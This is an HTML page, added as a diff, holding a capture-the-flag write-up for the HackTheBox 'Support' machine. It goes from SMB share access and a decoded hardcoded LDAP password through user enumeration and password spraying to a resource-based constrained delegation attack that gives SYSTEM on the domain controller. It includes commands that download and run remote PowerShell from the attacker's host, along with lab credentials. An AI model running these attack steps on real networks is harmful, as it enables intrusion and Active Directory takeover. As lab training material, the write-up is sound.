@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html>
+<div id="particles-js">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!--  Essential META Tags -->
+<meta property="og:title" content="Support HackTheBox Writeup">
+<meta name="description" content="Support HackTheBox Writeup | 0xv01d">
+<meta property="og:type" content="article" />
+<meta property="og:image" content="/images/HTB/support/support_card.png">
+<meta property="og:url" content="https://0xv01d.github.io/hackthebox/support">
+<meta name="twitter:card" content="/images/HTB/support/support_card.png">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/Scripts/js/particles.js"></script>
+    <script src="/Scripts/js/app.js"></script>
+<title>Support HackTheBox Writeup | 0xv01d</title>
+<meta property="og:locale" content="en_US">
+<script type="application/ld+json">
+</script>
+
+    <link rel="stylesheet" href="/Styles/style.css?v=">
+	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+<!-- Setup Google Analytics -->
+
+	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/support/favicon.ico">
+
+<!--Information Sidebar-->
+
+  </head>
+  <body>
+      <header class="app-header">
+        <a href="https:0xv01d.github.io">
+          <img class="avatar" src="/images/index/avatar.png">
+		</a><p></p>
+		<h1><strong>0xv01d</strong></h1>
+		<nav class="app-header-menu">
+			<a class="app-header-menu-item" href="/">Home</a>
+             - 
+			<a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+			<a class="app-header-menu-item" href="/about/">About</a>
+		</nav>
+		<p>Just another computer adict.</p>
+		<div text-align:="" center;="" width:="" 100%;="" class="app-header-media">
+			<a class="fab fa-github-square" href="https://github.com/0xv01d" rel="noreferrer noopener" target="_blank"><img src="/images/index/github.png"></a>
+			<a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener" target="_blank"><img src="/images/index/email.png"></img></a>
+			<a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a>
+			<a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
+		</div>
+        <a href="https://www.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
+			<img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
+        </a>
+        <div style="height: 7rem;"></div>
+      </header>
+
+      <main class="app-container">
+		
+		<article class="post">		
+			<header class="post-header">
+
+	
+<!--Machine Title-->
+			<div class="title">Support Walkthrough</div>			
+<!--Skill Tags-->								
+			<div class="tag-skills">
+				<svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+					<title>tag</title>
+					<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
+				</svg>
+				<a class="tag" href="#">SMB</a>
+				<a class="tag" href="#">.NET</a>
+				<a class="tag" href="#">LDAP</a>
+				<a class="tag" href="#">Wireshark</a>
+				<a class="tag" href="#">RPC</a>
+				<a class="tag" href="#">Winrm</a>
+				<a class="tag" href="#">BloodHound</a>
+				<a class="tag" href="#">RBCD</a>
+				<a class="tag" href="#">TGT</a>
+			</div>
+
+			</header>
+
+<!--Machine Card-->			
+			<div><img class="machine-card" style="max-width: 596px;" src="/images/HTB/support/support_card.png"></img></div>
+			
+<!--Machine Overview-->
+			<div class="subtitle">Support Overview</div>
+			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Support" rel="noreferrer noopener" target="_blank">Support</a> machine on HackTheBox, submitted by
+			<a href="https://app.hackthebox.com/users/4935" rel="noreferrer noopener" target="_blank">0xdf</a>. The machine starts with an IT-Staff resource shared by SMB where we can find a password through static analysis,
+			with which, we can enumerate ldap and get another credential and connect by winrm. This account has all acces over computer objects inside the domain, so we'll perform a <a href="https://www.notsoshant.io/blog/attacking-kerberos-resource-based-constrained-delegation/" rel="noreferrer noopener" target="_blank">RBCD</a> attack and get a ticket impersonating the Administrator.
+
+<!--Machine Resolution-->
+			<h1 id="header-1">Recon</h1>
+
+              <p class="head-img">As always let's start with a portscan, we have many ports open, and we can notice we're facing a DC, let's save the domain reported by nmap in the /etc/hosts, also we can add dc and dc.support.htb</p>
+            <img class="img-post" style="max-width: 1260px;" src="/images/HTB/support/nmap.png">
+
+            <p class="head-img">As the port 445 is open, let's try smb, taking a look at the shares we can notice we have acces to the staff tools</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">smbmap</span> -H 10.10.11.174 -u none
+[+] Guest session   .   IP: 10.10.11.174:445	Name: support.htb                                       
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	NO ACCESS	Logon server share 
+	support-tools                                     	READ ONLY	support staff tools
+	SYSVOL                                            	NO ACCESS	Logon server share 
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once we connect to smb we can see the shared files, let's download the UserInfo</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">smbclient</span> -N \\\\support.htb\\support-tools
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Wed Jul 20 13:01:06 2022
+  ..                                  D        0  Sat May 28 07:18:25 2022
+  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
+  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
+  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
+  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
+  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
+  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
+  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
+
+		4026367 blocks of size 4096. 953966 blocks available
+smb: \> get UserInfo.exe.zip
+getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (48.7 KiloBytes/sec) (average 48.7 KiloBytes/sec)
+smb: \> quit
+</span> </code></pre></div></div>
+
+            <p class="head-img">Listing the strings in the executable, we can assume that it's making some kind of request to ldap to get something, we can use dnSpy to understand it better, also ldap could be a probably user, since kerberos is open let's test it first</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">strings</span> -e l UserInfo.exe
+<....................................................>
+armando
+LDAP://support.htb
+support\ldap
+[*] LDAP query to use: 
+sAMAccountName
+[-] No users identified with that query.
+[+] Found 
+ result
+[-] Exception: 
+[*] Getting data for 
+pwdLastSet
+lastLogon
+givenName
+mail
+[-] Unable to locate 
+. Please try the find command to get the user's username.
+First Name:           
+Last Name:            
+Contact:              
+Last Password Change: 
+find
+Find a user
+user
+Get information about a user
+<....................................................>
+</span> </code></pre></div></div>
+
+            <p class="head-img">We have some valid users, let's save them for later, now let's dig a bit in the executable</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">kerbrute</span> userenum -t 100 -d support.htb --dc 10.10.11.174 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 08/16/22 - Ronnie Flathers @ropnop
+
+2022/12/27 22:20:41 >  Using KDC(s):
+2022/12/27 22:20:41 >  	10.10.11.174:88
+<span class="kt">
+2022/12/27 22:20:41 >  [+] VALID USERNAME:	ldap@support.htb
+2022/12/27 22:20:42 >  [+] VALID USERNAME:	support@support.htb
+2022/12/27 22:20:43 >  [+] VALID USERNAME:	guest@support.htb
+2022/12/27 22:20:46 >  [+] VALID USERNAME:	administrator@support.htb
+2022/12/27 22:21:22 >  [+] VALID USERNAME:	Guest@support.htb
+2022/12/27 22:21:22 >  [+] VALID USERNAME:	Administrator@support.htb
+2022/12/27 22:22:36 >  [+] VALID USERNAME:	management@support.htb
+2022/12/27 22:22:48 >  [+] VALID USERNAME:	Support@support.htb
+2022/12/27 22:23:21 >  [+] VALID USERNAME:	GUEST@support.htb
+2022/12/27 22:31:56 >  [+] VALID USERNAME:	SUPPORT@support.htb
+</span>
+</span> </code></pre></div></div>
+
+			<code class="comment">Well, from here there are two ways to proceed and get to the same place</code>
+			<p class="head-img"></p>
+			<h1 id="header-1">First Way</h1>
+			<code class="comment">You need to install <a href="https://learn.microsoft.com/en-us/powershell/scripting/install/install-debian?source=recommendations&view=powershell-7.3" rel="nonreferrer noopener" target="_blank">powershell</a>, after that, do a "sudo apt install dotnet-sdk-7.0 mono-complete"</code>
+            <p class="head-img">Once we run the executable we can notice that we can find a user or get info about one, let's open wireshark to see whats going on</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">./UserInfo.exe</span>
+
+Usage: UserInfo.exe [options] [commands]
+
+Options: 
+  -v|--verbose        Verbose output                                    
+
+Commands: 
+  find                Find a user                                       
+  user                Get information about a user   
+
+<span class="na">❯ </span><span class="kt">./UserInfo.exe</span> -v find -first ldap
+[*] LDAP query to use: (givenName=ldap)
+[-] Exception: No Such Object
+</span> </code></pre></div></div>
+
+  	          <p class="head-img">We can see that's talking to the box through ldap, if we follow the TCP stream we can get a password</p>
+            <img class="img-post" style="max-width: 1303px;" src="/images/HTB/support/wireshark.png">
+
+			<p class="head-img"></p>
+			<h1 id="header-1">Second Way</h1>
+
+              <p class="head-img">Once we open a Windows machine to decompile the executable with <a href="https://github.com/dnSpy/dnSpy" rel="nonreferrer noopener" target="_blank">dnSpy</a> we can see how it's querying ldap</p>
+            <img class="img-post" style="max-width: 760px;" src="/images/HTB/support/ldap_query.png">
+
+			
+              <p class="head-img">In the Protected module we can see how it's getting the password, basically it's decoding it from base64 and XORing with the encrypted key which is armando and again with 223</p>
+            <img class="img-post" style="max-width: 788px;" src="/images/HTB/support/protected_module.png">
+
+              <p class="head-img">We can decode it easily with <a href="https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'armando'%7D,'Standard',true)XOR(%7B'option':'Decimal','string':'223'%7D,'Standard',true)&input=ME52MzJQVHdnWWp6ZzkvOGo1VGJtdlBkM2U3V2h0V1d5dVBzeU83Ni9ZK1UxOTNF" rel="nonreferrer noopener" target="_blank">cyberchef</a></p>
+            <img class="img-post" style="max-width: 780px;" src="/images/HTB/support/cyberchef.png">
+
+
+            <p class="head-img">Now, since we got the ldap password, let's enumerate all the domain users, we could probably miss someone before, and let's add them to our dictionary</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">rpcclient</span> -U <span class="k">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> support.htb -c <span class="k">'enumdomusers'</span>
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[ldap] rid:[0x450]
+user:[support] rid:[0x451]
+user:[smith.rosario] rid:[0x452]
+user:[hernandez.stanley] rid:[0x453]
+user:[wilson.shelby] rid:[0x454]
+user:[anderson.damian] rid:[0x455]
+user:[thomas.raphael] rid:[0x456]
+user:[levine.leopoldo] rid:[0x457]
+user:[raven.clifton] rid:[0x458]
+user:[bardot.mary] rid:[0x459]
+user:[cromwell.gerard] rid:[0x45a]
+user:[monroe.david] rid:[0x45b]
+user:[west.laura] rid:[0x45c]
+user:[langley.lucy] rid:[0x45d]
+user:[daughtler.mabel] rid:[0x45e]
+user:[stoll.rachelle] rid:[0x45f]
+user:[ford.victoria] rid:[0x460]
+
+<span class="na">❯ </span><span class="kt">rpcclient</span> -U <span class="k">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> support.htb -c <span class="k">'enumdomusers'</span> | <span class="kt">awk</span> <span class="k">'{print $1}'</span> | <span class="kt">cut</span> -d <span class="k">'['</span> -f 2 | <span class="kt">tr</span> -d <span class="k">']'</span> > valid.users
+</span> </code></pre></div></div>
+
+            <p class="head-img">Enumerating ldap we can find a password in the info field of the user support</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">ldapsearch</span> -h support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'dc=support, dc=htb' > ldap.results
+
+<span class="na">❯ </span><span class="kt">cat</span> ldap.results | <span class="kt">grep</span> -i <span class="k"> 'samaccountname: support'</span> -B 37
+
+# support, Users, support.htb
+dn: CN=support,CN=Users,DC=support,DC=htb
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: support
+c: US
+l: Chapel Hill
+st: NC
+postalCode: 27514
+distinguishedName: CN=support,CN=Users,DC=support,DC=htb
+instanceType: 4
+whenCreated: 20220528111200.0Z
+whenChanged: 20220528111201.0Z
+uSNCreated: 12617
+info: <span class="gd">Ironside47pleasure40Watchful</span>
+memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+uSNChanged: 12630
+company: support
+streetAddress: Skipper Bowles Dr
+name: support
+objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132982099209777070
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: support
+</span> </code></pre></div></div>
+
+            <p class="head-img">Testing it with crackmapexec we find out that's valid for the user support, also we can connect via winrm</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">crackmapexec</span> smb support.htb -u valid.users -p <span class="k">'Ironside47pleasure40Watchful'</span> --continue-on-succes
+<span class="x">SMB</span>         support.htb     445    DC               <span class="x">[*]</span> Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\Administrator:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\Guest:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\krbtgt:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\ldap:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="kt">[+]</span> support.htb\support:Ironside47pleasure40Watchful 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\smith.rosario:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\hernandez.stanley:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\wilson.shelby:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\anderson.damian:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\thomas.raphael:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\levine.leopoldo:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\raven.clifton:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\bardot.mary:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\cromwell.gerard:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\monroe.david:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\west.laura:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\langley.lucy:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\daughtler.mabel:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\stoll.rachelle:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+<span class="x">SMB</span>         support.htb     445    DC               <span class="gd">[-]</span> support.htb\ford.victoria:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
+
+<span class="na">❯ </span><span class="kt">crackmapexec</span> winrm support.htb -u <span class="k">'support'</span> -p <span class="k">'Ironside47pleasure40Watchful'</span>
+<span class="x">SMB</span>         support.htb     5985   DC               <span class="x">[*]</span> Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
+<span class="x">HTTP</span>        support.htb     5985   DC               <span class="x">[*]</span> http://support.htb:5985/wsman
+<span class="x">WINRM</span>       support.htb     5985   DC               <span class="kt">[+]</span> support.htb\support:Ironside47pleasure40Watchful <span class="k">(Pwn3d!)</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once in, we can read the first flag</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">evil-winrm</span> -i 10.10.11.174 -u support -p <span class="k">'Ironside47pleasure40Watchful'</span>
+
+<span class="x">Evil-WinRM shell v3.4</span>
+
+<span class="k">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span>
+
+<span class="m">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span>
+
+<span class="x">Info: Establishing connection to remote endpoint</span>
+
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\Users\support\Documents> type ..\Desktop\user.txt
+8294ff062d5d6daafacf2178817fb82e
+</span> </code></pre></div></div>
+
+			<p class="head-img"></p>
+			<h1 id="header-1">PrivEsc</h1>
+
+              <p class="head-img">Enumearting a bit with bloodhound, we notice that we're member of SharedSupport which has GenericAll against the DC, which means that we have all acces over computer objects inside the domain, so, then the thing is this, we're going to perform a <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation" rel="nonreferrer noopener" target="_blank">RBCD</a> attack creating a computer object, and then take over of it giving it privileges to sign kerberos tickets for other users</p>
+            <img class="img-post" style="max-width: 543px;" src="/images/HTB/support/bloodhound.png">
+
+
+            <p class="head-img">Let's upload <a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1" rel="noopener noreferrer" target="_blank">Powermad.ps1</a> and <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" rel="noopener noreferrer" target="_blank">PowerView.ps1</a>, we can upload it with the built in upload from evil-winrm but is very slow, i'll just mount a server and make the request</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.30:8000/Powermad.ps1')
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.30:8000/PowerView.ps1')
+</span></span> </code></pre></div></div>
+
+			<p class="head-img">Now let's start with the attack, as we can see we can create 10 computer objects, we'll create a machine account</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota
+
+ms-ds-machineaccountquota
+-------------------------
+                       10
+
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> New-MachineAccount -MachineAccount dev -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force) -Verbose
+Verbose: [+] Domain Controller = dc.support.htb
+Verbose: [+] Domain = support.htb
+Verbose: [+] SAMAccountName = dev$
+Verbose: [+] Distinguished Name = CN=dev,CN=Computers,DC=support,DC=htb
+[+] Machine account dev added
+</span></span> </code></pre></div></div>
+
+			<p class="head-img">Let's get the object SID of the computer we just created</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> Get-DomainComputer dev -Properties objectsid
+
+objectsid
+---------
+S-1-5-21-1677581083-3380853377-188903654-5101
+
+
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> 
+</span></span> </code></pre></div></div>
+
+			<p class="head-img">Now let's build a generic Acces Control Entry with the computer SID we got, so we can set the permission we need</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5101)"
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> $SDBytes = New-Object byte[] ($SD.BinaryLength)
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> $SD.GetBinaryForm($SDBytes, 0)
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> 
+</span></span> </code></pre></div></div>
+
+            <p class="head-img">Let's set this new security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata>                                                                  
+</span></span> </code></pre></div></div>
+
+            <p class="head-img">It worked, as we can see we have the necessary permission</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
+
+msds-allowedtoactonbehalfofotheridentity
+----------------------------------------
+{1, 0, 4, 128...}
+
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata>
+</span></span> </code></pre></div></div>
+
+            <p class="head-img">Now let's get a TGT as administrator using impacket-getST, and then export it as an environment variable</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">impacket-getST</span> -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/dev$:Password123
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+<span class="na">❯ </span><span class="k">export</span> KRB5CCNAME=Administrator.ccache
+</span> </code></pre></div></div>
+
+            <p class="head-img">Finally we can connect using psexec, and we can read the final flag</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">impacket-psexec</span> -k dc.support.htb
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on dc.support.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file CzvDKqSx.exe
+[*] Opening SVCManager on dc.support.htb.....
+[*] Creating service fvwf on dc.support.htb.....
+[*] Starting service fvwf.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.859]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+ce18964a9a0f44099e2e3149629afd19
+
+C:\Windows\system32>
+</span> </code></pre></div></div>
+
+<a href="#">Go back</a>
+		</article>
+      </main>
+  </body>
+</div>
+</html>
